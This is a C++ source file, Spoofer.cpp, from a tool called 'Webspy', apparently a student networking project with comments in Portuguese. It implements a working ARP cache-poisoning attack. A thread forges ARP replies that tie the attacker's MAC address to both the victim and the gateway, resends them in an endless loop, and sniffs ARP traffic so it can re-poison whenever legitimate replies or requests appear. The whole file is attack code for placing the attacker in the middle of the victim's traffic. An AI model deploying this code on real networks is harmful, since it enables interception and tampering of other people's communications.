/*
 * Spoofer.cpp
 *
 *  Created on: Apr 7, 2015
 *      Author: Felipe Rodopoulos
 */

#include "Spoofer.h"

Spoofer::Spoofer() {}

Spoofer::~Spoofer() {}

void Spoofer::init(){
	pthread_t thread;
	if(pthread_create(&thread, NULL, spoof, NULL) < 0){
		printf("Webspy::Spoofer::Constructor > [ERRO] can't init spoofing thread\n");
		exit(EXIT_FAILURE);
	}
}

void* Spoofer::spoof(void* args){
	printf("Spoofing thread is running\n");
	// Poisoned frame to victim
	Crafter toVictim(Globals::iface);
	toVictim.arp(
		ARPOP_REPLY,
		Globals::attacker.mac->ether_addr_octet, Globals::gateway.ip,
		Globals::victim.mac->ether_addr_octet, Globals::victim.ip
	);
	toVictim.ethernet(
		ETHERTYPE_ARP,
		Globals::attacker.mac->ether_addr_octet,
		Globals::victim.mac->ether_addr_octet
	);

	// Poisoned frame to gateway
	Crafter toGateway(Globals::iface);
	if(!Globals::gateway.mac){
		fprintf(stderr, "Webspy::Spoofer::spoof > [ERRO] gateway's mac is NULL\n");
		exit(EXIT_FAILURE);
	}
	toGateway.arp(
		ARPOP_REPLY,
		Globals::attacker.mac->ether_addr_octet, Globals::victim.ip,
		Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip
	);
	toGateway.ethernet(
		ETHERTYPE_ARP,
		Globals::attacker.mac->ether_addr_octet,
		Globals::gateway.mac->ether_addr_octet
	);

	char filter[] = "arp";
	Sniffer sniffer(filter);

	do{
		// Spoofando de novo
		toVictim.send();
		toGateway.send();

		sniffer.listen(spoofBack);
	} while(true);

	return NULL;
}

void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet) {
	pcap_t* pcapContext = (pcap_t*) args;
	Ethernet ether((unsigned char*) packet);

	if(htons(ether.ptype) == ETHERTYPE_ARP){
		ARP arp((unsigned char*) packet);

		/* printf("%s de %s para %s\n",
				htons(arp.arpOp) == ARPOP_REPLY ? "REPLY" : "REQUEST",
				Host::ipToString(arp.spaddr).c_str(),
				Host::ipToString(arp.tpaddr).c_str()
		); */

		/* Se algumas das vitimas manda um ARP Reply valido (sem o MAC do atacante como sender) */
		if(htons(arp.arpOp) == ARPOP_REPLY){
			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
				//printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
				pcap_breakloop(pcapContext);
			}

		/* Se alguem manda um ARP Request perguntando quem é uma das vítimas */
		} else if (htons(arp.arpOp) == ARPOP_REQUEST){
			if((arp.tpaddr == Globals::victim.ip || arp.tpaddr == Globals::gateway.ip)
			  && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
				//printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
				pcap_breakloop(pcapContext);
			}
		}
	}
}
